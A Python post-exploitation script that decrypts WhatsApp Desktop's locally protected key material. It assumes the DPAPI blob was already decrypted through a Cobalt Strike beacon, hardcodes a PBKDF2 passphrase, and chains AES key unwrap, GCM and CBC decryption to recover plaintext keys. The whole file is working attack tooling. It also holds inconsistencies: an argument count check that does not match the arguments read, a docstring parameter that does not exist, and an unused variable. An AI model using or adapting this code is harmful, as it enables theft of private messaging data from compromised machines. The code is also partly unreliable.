import binascii
import sys
import base64
from Crypto.Cipher import AES
from cryptography.hazmat.primitives.keywrap import aes_key_unwrap
from cryptography.hazmat.primitives.ciphers import algorithms
from Crypto.Util.Padding import unpad
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Hash import SHA256
import struct

def ns_decrypt(whatsapp_app_uid, dpapi_blob, wrapped_key, nonce, cipher_text, gcm_tag, has_padding):
    """
    Implements the nsDecrypt function in Python.
    
    :param dpapi_blob: DPAPI-encrypted key (already decrypted via Cobalt Strike BOF)
    :param wrapped_key: AES-wrapped key
    :param nonce: AES-GCM nonce
    :param cipher_text: Encrypted data
    :param gcm_tag: GCM authentication tag
    :param passphrase: Passphrase for PBKDF2 key derivation
    :param has_padding: Boolean flag for padding mode
    :return: Decrypted plaintext bytes
    """

    # Simulate DPAPI decryption (assumes DPAPI unprotect is already handled on the beacon)
    kek = base64.b64decode(dpapi_blob)  # In PowerShell, this was decrypted with DPAPI
    wrapped_key = base64.b64decode(wrapped_key)
    nonce = base64.b64decode(nonce)
    gcm_tag = base64.b64decode(gcm_tag)
    cipher_text = base64.b64decode(cipher_text)
    passphrase = "5303b14c0984e9b13fe75770cd25aaf7"

    # Unwrap AES key
    gcm_key = aes_key_unwrap(kek, wrapped_key, algorithms.AES)


    # AES-GCM decryption
    gcm_cipher = AES.new(gcm_key, AES.MODE_GCM, nonce=nonce)
    cipher_text_tagged = cipher_text + gcm_tag

    try:
        second_cipher_text = gcm_cipher.decrypt_and_verify(cipher_text, gcm_tag)
    except ValueError:
        print("GCM authentication failed!")
        return None

    # PBKDF2 key derivation
    iterations = 10000
    enc_key = PBKDF2(bytes.fromhex(passphrase), bytes.fromhex(whatsapp_app_uid), dkLen=32, count=iterations, hmac_hash_module=SHA256)
    iv = PBKDF2(enc_key, bytes.fromhex(whatsapp_app_uid), dkLen=16, count=iterations, hmac_hash_module=SHA256)

    # AES-CBC decryption
    cbc_cipher = AES.new(enc_key, AES.MODE_CBC, iv)

    decrypted_bytes = cbc_cipher.decrypt(second_cipher_text)

    if has_padding:
        decrypted_bytes = unpad(decrypted_bytes, AES.block_size)

    return decrypted_bytes


def read_bytes_from_data(data, offset, length):
    """Reads bytes from a given byte sequence at a specific offset and length."""
    return data[offset:offset + length]

def retrieve_keys_ns18(n18_data):
    # Read dpapiBlob
    byte_array = read_bytes_from_data(n18_data, 0x2B, 2)
    dpapi_blob_size = struct.unpack("<H", byte_array[::-1])[0]  # Little-endian conversion
    print(dpapi_blob_size)

    dpapi_blob = read_bytes_from_data(n18_data, 0x2D, dpapi_blob_size)
    print(binascii.hexlify(dpapi_blob).decode().upper())

    

if len(sys.argv) < 8:
    print("Usage: decrypt.py <whatsapp_app_uid> <dpapi_blob> <wrapped_key> <nonce> <cipher_text> <gcm_tag> <has_padding> <ns16/18 flag>")
    sys.exit(1)

decrypted_data = ns_decrypt(
    sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5], sys.argv[6],int(sys.argv[7])
)


if int(sys.argv[8]) == 1:
    retrieve_keys_ns18(decrypted_data)

if decrypted_data:
    print(decrypted_data.hex())

